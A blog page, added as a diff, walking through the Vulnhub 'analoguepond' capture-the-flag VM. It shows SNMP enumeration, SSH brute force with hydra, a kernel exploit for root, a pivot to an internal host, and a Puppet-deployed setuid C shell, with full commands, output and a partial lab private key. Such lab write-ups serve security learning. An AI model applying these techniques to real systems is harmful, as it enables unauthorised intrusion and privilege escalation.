@@ -1,0 +1,375 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>[Vulnhub] analoguepond - Walkthrough Part 1 &middot; M1r4c13</title>
+<meta name="description" content="[Vulnhub] analoguepond - Walkthrough Part 1 -- M1r4c13 study notes, restored.">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Ccircle cx='8' cy='8' r='2.2' fill='%23d8c08a'/%3E%3Ccircle cx='8' cy='8' r='6.5' fill='none' stroke='%23d8c08a' stroke-opacity='.35' stroke-width='.8'/%3E%3C/svg%3E">
+<link rel="stylesheet" href="../blog.css">
+</head>
+<body>
+<header class="blog-head">
+<a class="mono back-link" href="/">xhyu@sky:~$ cd ~</a>
+<a class="brand brand-link" href="/blog/">M1r4c13</a>
+</header>
+<main><article class="post">
+<h1 class="post-title">[Vulnhub] analoguepond - Walkthrough Part 1</h1>
+<p class="meta"><span class="mono meta-date">2017.08.09</span><span class="tags"><span class="chip mono">vulnhub</span><span class="chip mono">ctf</span></span></p>
+<div class="post-body"><p>You can find the VM download link <a href="https://www.vulnhub.com/entry/analougepond-1,185/">here</a>.</p>
+<pre><code>Attacker: 192.168.56.101
+Victim: 192.168.56.103
+</code></pre>
+<p>First I welcomed it with a straightforward nmap scan</p>
+<pre><code class="language-bash">nmap -A 192.168.56.103
+</code></pre>
+<p>I didn't find any open port in the first round. Then I tried an udp scan and did find a 161 port. </p>
+<pre><code class="language-bash">root@kali:~/vulnerhub/analoguepond# nmap -sU 192.168.56.103
+
+Starting Nmap 7.50 ( https://nmap.org ) at 2017-08-09 16:05 EDT
+
+Nmap scan report for 192.168.56.103
+Host is up (0.00039s latency).
+Not shown: 998 closed ports
+PORT    STATE         SERVICE
+68/udp  open|filtered dhcpc
+161/udp open          snmp
+MAC Address: 08:00:27:0A:79:7F (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1086.52 seconds
+</code></pre>
+<p>It's a snmp service. Try to gather some information about it.</p>
+<pre><code class="language-bash">root@kali:~/vulnerhub# snmp-check 192.168.56.103
+snmp-check v1.9 - SNMP enumerator
+Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
+
+[+] Try to connect to 192.168.56.103:161 using SNMPv1 and community 'public'
+
+[*] System information:
+
+  Host IP address               : 192.168.56.103
+  Hostname                      : analoguepond
+  Description                   : Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64
+  Contact                       : Eric Burdon &lt;eric@example.com&gt;
+  Location                      : There is a house in New Orleans they call it...
+  Uptime snmp                   : 15:46:07.20
+  Uptime system                 : 15:45:30.22
+  System date                   : 2017-8-9 17:59:18.0
+</code></pre>
+<p>I also tried other ways like nmap:</p>
+<pre><code class="language-bash">root@kali:~/vulnerhub# ls /usr/share/nmap/scripts/ | grep snmp
+snmp-brute.nse
+snmp-hh3c-logins.nse
+snmp-info.nse
+snmp-interfaces.nse
+snmp-ios-config.nse
+snmp-netstat.nse
+snmp-processes.nse
+snmp-sysdescr.nse
+snmp-win32-services.nse
+snmp-win32-shares.nse
+snmp-win32-software.nse
+snmp-win32-users.nse
+root@kali:~/vulnerhub# nmap -sU -Pn -p 161 192.168.56.103 --script=snmp-brute.nse
+
+Starting Nmap 7.50 ( https://nmap.org ) at 2017-08-09 16:22 EDT
+Nmap scan report for 192.168.56.103
+Host is up (-0.17s latency).
+
+PORT    STATE SERVICE
+161/udp open  snmp
+| snmp-brute: 
+|_  public - Valid credentials
+MAC Address: 08:00:27:0A:79:7F (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.99 seconds
+</code></pre>
+<p>There we found a 'public' string for the community name, then we can try snmpwalk</p>
+<pre><code class="language-bash">root@kali:~/vulnerhub# snmpwalk -v 1 -c public 192.168.56.103
+iso.3.6.1.2.1.1.1.0 = STRING: &quot;Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64&quot;
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+iso.3.6.1.2.1.1.3.0 = Timeticks: (5719592) 15:53:15.92
+iso.3.6.1.2.1.1.4.0 = STRING: &quot;Eric Burdon &lt;eric@example.com&gt;&quot;
+iso.3.6.1.2.1.1.5.0 = STRING: &quot;analoguepond&quot;
+iso.3.6.1.2.1.1.6.0 = STRING: &quot;There is a house in New Orleans they call it...&quot;
+iso.3.6.1.2.1.1.7.0 = INTEGER: 72
+iso.3.6.1.2.1.1.8.0 = Timeticks: (10) 0:00:00.10
+iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.11.3.1.1
+iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.15.2.1.1
+iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.10.3.1.1
+iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
+iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.2.1.49
+iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.4
+iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
+iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.6.3.16.2.2.1
+iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
+iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
+iso.3.6.1.2.1.1.9.1.3.1 = STRING: &quot;The MIB for Message Processing and Dispatching.&quot;
+iso.3.6.1.2.1.1.9.1.3.2 = STRING: &quot;The management information definitions for the SNMP User-based Security Model.&quot;
+iso.3.6.1.2.1.1.9.1.3.3 = STRING: &quot;The SNMP Management Architecture MIB.&quot;
+iso.3.6.1.2.1.1.9.1.3.4 = STRING: &quot;The MIB module for SNMPv2 entities&quot;
+iso.3.6.1.2.1.1.9.1.3.5 = STRING: &quot;The MIB module for managing TCP implementations&quot;
+iso.3.6.1.2.1.1.9.1.3.6 = STRING: &quot;The MIB module for managing IP and ICMP implementations&quot;
+iso.3.6.1.2.1.1.9.1.3.7 = STRING: &quot;The MIB module for managing UDP implementations&quot;
+iso.3.6.1.2.1.1.9.1.3.8 = STRING: &quot;View-based Access Control Model for SNMP.&quot;
+iso.3.6.1.2.1.1.9.1.3.9 = STRING: &quot;The MIB modules for managing SNMP Notification, plus filtering.&quot;
+iso.3.6.1.2.1.1.9.1.3.10 = STRING: &quot;The MIB module for logging SNMP Notifications.&quot;
+iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (10) 0:00:00.10
+iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (10) 0:00:00.10
+iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (10) 0:00:00.10
+iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (10) 0:00:00.10
+iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (10) 0:00:00.10
+iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (10) 0:00:00.10
+iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (10) 0:00:00.10
+iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (10) 0:00:00.10
+iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (10) 0:00:00.10
+iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (10) 0:00:00.10
+iso.3.6.1.2.1.25.1.1.0 = Timeticks: (5723292) 15:53:52.92
+iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E1 08 09 12 07 04 00 2B 01 00 
+iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
+iso.3.6.1.2.1.25.1.4.0 = STRING: &quot;BOOT_IMAGE=/vmlinuz-3.19.0-25-generic root=/dev/mapper/analoguepond--vg-root ro
+&quot;
+iso.3.6.1.2.1.25.1.5.0 = Gauge32: 3
+iso.3.6.1.2.1.25.1.6.0 = Gauge32: 43
+iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
+End of MIB
+</code></pre>
+<p>Looks llike tons of information here we got.<br>
+Noticed this line <code>iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-3.19.0-25-generic root=/dev/mapper/analoguepond--vg-root ro</code> says the permission is <code>ro</code> read only, so it's more possible to find info than exploit this snmp service.<br>
+There is a username eric. <code>iso.3.6.1.2.1.1.4.0 = STRING: "Eric Burdon &lt;eric@example.com&gt;"</code><br>
+And there is something like a hint: <code>iso.3.6.1.2.1.1.6.0 = STRING: "There is a house in New Orleans they call it..."</code><br>
+Googled it, the hint should refer to this: </p>
+<pre><code>There is a house in New Orleans 
+They call the Rising Sun
+</code></pre>
+<p>So suppose it's the password, try it:</p>
+<pre><code class="language-bash">root@kali:~/vulnerhub/analoguepond# cat pass
+risingsun
+therisingsun
+houseoftherisingsun
+rising sun
+the rising sun
+house of the rising sun
+
+root@kali:~/vulnerhub/analoguepond# john --wordlist:pass --rules --stdout &gt; pass1
+Press 'q' or Ctrl-C to abort, almost any other key for status
+157p 0:00:00:00 100.00% (2017-08-09 16:39) 872.2p/s Houseoftherisingsuning
+root@kali:~/vulnerhub/analoguepond# hydra -l eric -P pass1 192.168.56.103 ssh
+Hydra v8.5 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-08-09 16:39:55
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 157 login tries (l:1/p:157), ~10 tries per task
+[DATA] attacking service ssh on port 22
+[22][ssh] host: 192.168.56.103   login: eric   password: therisingsun
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2017-08-09 16:39:58
+</code></pre>
+<p>I'm in.</p>
+<pre><code class="language-bash">root@kali:~/vulnerhub/analoguepond# ssh eric@192.168.56.103
+eric@192.168.56.103's password: 
+Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 3.19.0-25-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+ System information disabled due to load higher than 1.0
+eric@analoguepond:~$ ls
+reticulatingsplines.gif
+</code></pre>
+<p>I tunneled it out to my kali, it's only a picture, nothing special after tried some tools on it.<br>
+Then I did a find trying to escalate the privilege, but nothing special either.<br>
+Then check the version and find out it's an old and broken kernel.</p>
+<pre><code class="language-bash">eric@analoguepond:~$ uname -a
+Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+</code></pre>
+<p>So download the overlayfs exploitation script <a href="https://www.exploit-db.com/exploits/39166/">here</a>, compiled it on wherever and run it, we got the root.</p>
+<pre><code class="language-bash">eric@analoguepond:~$ ./ofs
+root@analoguepond:~# whoami
+root
+root@analoguepond:~# id
+uid=0(root) gid=1000(eric) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(libvirtd),112(lpadmin),113(sambashare),1000(eric)
+</code></pre>
+<p>Navigated to /root, found this:</p>
+<pre><code class="language-bash">root@analoguepond:/root# ls
+flag.txt
+root@analoguepond:/root# cat flag.txt 
+C'Mon Man! Y'all didn't think this was the final flag so soon...?
+
+Did the bright lights and big city knock you out...? If you pull
+a stunt like this again, I'll send you back to Walker...
+
+This is obviously troll flah #1 So keep going.
+</code></pre>
+<p>Ok then, let's dig deeper. Check the net status.</p>
+<pre><code class="language-bash">root@analoguepond:/root# netstat -nplt
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      1214/dnsmasq    
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      932/sshd        
+tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      1224/qemu-system-x8
+tcp        0      0 127.0.0.1:5901          0.0.0.0:*               LISTEN      1260/qemu-system-x8
+tcp6       0      0 :::22                   :::*                    LISTEN      932/sshd        
+</code></pre>
+<p>So, 5900 &amp; 5901 first attracted me because I'm poking around with my raspberry pi recently. These two ports are for vnc service. So I want to connect to it just for my curiourcity. But it turned out failed because it asked me for a passwd and I still have nothing now.</p>
+<p>So, I noticed that it is connecting to another network. I want to scan that net but obviously I can't do nmap or netdiscover on the victim so I choosed to ping.</p>
+<pre><code class="language-bash">root@analoguepond:/tmp# cat pingall.sh 
+#!/bin/bash
+# Program name: pingall.sh
+trap 'exit 1;' INT
+date
+while IFS= read -r ip
+do
+    ping -c 1 &quot;$ip&quot; &gt; /dev/null
+    if [ $? -eq 0 ]; then
+    #echo &quot;node $output is up&quot; 
+    echo &quot;$ip&quot; 
+    #else
+    #echo &quot;node $output is down&quot;
+    fi
+done &lt; &quot;${1:-/dev/stdin}&quot;
+
+root@analoguepond:/tmp# seq -f &quot;192.168.122.%g&quot; 1 254 |./pingall.sh 
+Wed Aug  9 18:46:12 BST 2017
+192.168.122.1
+192.168.122.2
+192.168.122.3
+</code></pre>
+<p>Here I got three hosts up and the .1 is me.<br>
+Then, honestly, I had no idea what to do next for a long time and finally, I tried to ssh it........</p>
+<pre><code class="language-bash">root@analoguepond:/etc# ssh 192.168.122.2
++-----------------------------------------------------------------------------+
+| Passwords are very dated.. Removing spaces helps sandieshaw log in with her |
+| most famous song                                                            |
++-----------------------------------------------------------------------------+
+</code></pre>
+<p>A sweet hint. :D<br>
+so, username: sandieshaw, passwd: just google it you'll find it is 'puppet on a string' then 'remove spaces' -&gt; 'puppetonastring'</p>
+<pre><code class="language-bash">sandieshaw@192.168.122.2's password: 
+Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 4.4.0-57-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Wed Aug  9 16:33:33 BST 2017
+
+  System load:  0.19              Processes:           116
+  Usage of /:   68.6% of 1.58GB   Users logged in:     1
+  Memory usage: 20%               IP address for eth0: 192.168.122.2
+  Swap usage:   0%
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+</code></pre>
+<p>Nice, I'm in. (192.168.122.2)</p>
+<p>So, here I found a private key but I didn't know what it is for or would it be useful or not, so just left it there.</p>
+<pre><code class="language-bash">sandieshaw@puppet:~/.puppet/ssl/private_keys$ cat puppet.example.com.pem 
+-----BEGIN RSA PRIVATE KEY-----
+MIIJKgIBAAKCAgEAz+WFfYBB693Ka/WORuFspH34JzLjYvZcX2Tnwgk9nvlargML
+SoFQl4j0r/0p5Jq9sOXS+Tj7rmYvcQv91ypvpHRC2T905JxPYB3AghuIB5QG/ugR
+Cbnotu9RCbOd1dnSql5zriCfIH9kfBGaoCZ+vyAuj4OugEol3vcni4IIOT6QM1hp
+j2u2fz3tgzNbEFa8LXEzkXNTXC2gW5Pc72vTwprMLhNzHhZo1TUJH3x1dF/XWzkp
+75RnBIbiY14LDkZsZ+lYGEaocgL33BlTSXwiH232oR3IJCNI7Tk7YlSQLaSQhYmR
+</code></pre>
+<p>Do a find:</p>
+<pre><code class="language-bash">sandieshaw@puppet:~$ find / -xdev -perm /6000 \( -user root -o -group root \) 2&gt;/dev/null
+</code></pre>
+<p>There is an interesting file <code>/tmp/spin</code><br>
+But when I run it, there is only a cursor which spinning forever. I tried radare to reverse it, and other little tools, no luck.</p>
+<p>there I stuck again. After viewed other's walkthrough, I navigated to /etc, and find /etc/puppet</p>
+<pre><code class="language-bash">sandieshaw@puppet:/etc/puppet$ ls
+auth.conf     etckeeper-commit-post  files        manifests  puppet.conf
+environments  etckeeper-commit-pre   fileserver.conf  modules    templates
+sandieshaw@puppet:/etc/puppet/modules$ ls
+fiveeights  vulnhub  wiggle
+sandieshaw@puppet:/etc/puppet/modules$ cd wiggle/
+sandieshaw@puppet:/etc/puppet/modules/wiggle$ ls
+files  manifests
+sandieshaw@puppet:/etc/puppet/modules/wiggle$ cd files/
+sandieshaw@puppet:/etc/puppet/modules/wiggle/files$ ls
+spin  spin.c
+</code></pre>
+<p>There are many interesting files. First, the puppet is a system that helps system managers to automatically monitor and host files on devices in the system.<br>
+Second, there is a spin.c for us.</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+void
+advance_spinner() {
+    static char bars[] = { '/', '-', '\\', '|' };
+    static int nbars = sizeof(bars) / sizeof(char);
+    static int pos = 0;
+
+    printf(&quot;%c\r&quot;, bars[pos]);
+    fflush(stdout);
+    pos = (pos + 1) % nbars;
+}
+
+int
+main() {
+    while (1) {
+        advance_spinner();
+        usleep(300);
+    }
+
+    return 0;
+}
+</code></pre>
+<p>But I can't find a easy way to exploit it. But I found this file:</p>
+<pre><code class="language-bash">sandieshaw@puppet:/etc/puppet/modules/wiggle/manifests$ cat init.pp 
+## My first puppet module by Nick Leeson (C) Barringsbank
+## Put spin binary in /tmp to confirm puppet is working
+class wiggle {
+
+file { [ &quot;/tmp/spin&quot; ]:
+  ensure  =&gt; present,
+  mode    =&gt; 4755,
+  owner   =&gt; root,
+  group   =&gt; root,
+  source  =&gt; &quot;puppet:///modules/wiggle/spin&quot;;
+  }
+
+
+}
+</code></pre>
+<p>honestly, I learned this from other's walkthrough.<br>
+But here I know that the /tmp/spin is synchronized from /wiggle/file/spin (I guess /file is a default path in puppet).<br>
+Which means, we can write another spin file and the puppet system would replace the /tmp/spin with it and grant it 4000 permission, which is good.</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+void main() {
+    execvp(&quot;/bin/sh&quot;, NULL);
+}
+</code></pre>
+<p>And wait for our new /tmp/spin, run it.</p>
+<pre><code class="language-bash">sandieshaw@puppet:/tmp$ ./spin 
+# whoami
+root
+# id
+uid=1000(sandieshaw) gid=1000(sandieshaw) euid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(sandieshaw)
+# 
+</code></pre>
+<p>Got the root!</p>
+<pre><code class="language-bash"># pwd
+/root/protovision
+# ls -la
+total 24
+drwxr-xr-x 3 root root 4096 Dec 21  2016 .
+drwx------ 4 root root 4096 Jan  7  2017 ..
+-rw-r--r-- 1 root root  401 Dec 21  2016 flag1.txt.0xff
+drwxr-xr-x 3 root root 4096 Dec 21  2016 .I_have_you_now
+-rw-r--r-- 1 root root   39 Dec 17  2016 jim
+-rw-r--r-- 1 root root   53 Dec 17  2016 melvin
+# cat flag1.txt.0xff
+3d3d674c7534795a756c476130565762764e4849793947496c4a585a6f5248496b4a3362334e3363684248496842435a756c6d5a675148616e6c5762675533623542434c756c47497a564764313557617442794d79415362764a6e5a674d585a7446325a79463256676732593046326467777961793932646751334a754e585a765247497a6c47613042695a4a4279615535454d70647a614b706b5a48316a642f67325930463264763032626a35535a6956486431395765756333643339794c364d486330524861
+# 
+</code></pre>
+<p>Finally, we got the first flag. So, this is a good point to end part 1 and I'll publish part 2 later. </p>
+<p>Thanks for watching.</p>
+<p>Cheers!</p></div>
+</article></main>
+<footer class="blog-foot">
+ <p class="mono foot-line">m1r4c13 &middot; study notes &middot; 2017 to 2018 &middot; restored</p>
+ <p class="coda"><span class="cn-inline">世界并不完美，却令人着迷。</span></p>
+</footer>
+</body>
+</html>
